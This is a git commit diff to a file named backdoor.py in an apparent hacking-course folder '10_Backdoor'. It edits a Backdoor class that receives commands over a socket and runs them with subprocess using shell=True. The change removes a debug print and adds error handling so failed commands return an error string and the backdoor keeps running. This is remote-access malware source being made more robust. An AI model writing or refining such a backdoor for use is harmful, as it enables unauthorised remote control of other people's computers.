2167b481cdbc3a38fe37db1198cc84ecab10767e
Sumeet Singh <sumeet605@gmail.com>
2024-08-07 19:31:12 -0400

    d

--- 10_Backdoor/backdoor.py
+++ 10_Backdoor/backdoor.py
@@ -13,11 +13,13 @@ class Backdoor:
         
     def reliable_receive(self):
         json_data = self.connection.recv(1024).decode()
-        print(json.loads(json_data)[0])
         return json.loads(json_data)
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        try:
+            return subprocess.check_output(command, shell=True)
+        except subprocess.CalledProcessError as e:
+            return "command '{}' return with error (code {}): {}".format(e.cmd, e.returncode, e.output)
 
     def run(self):
         while True:
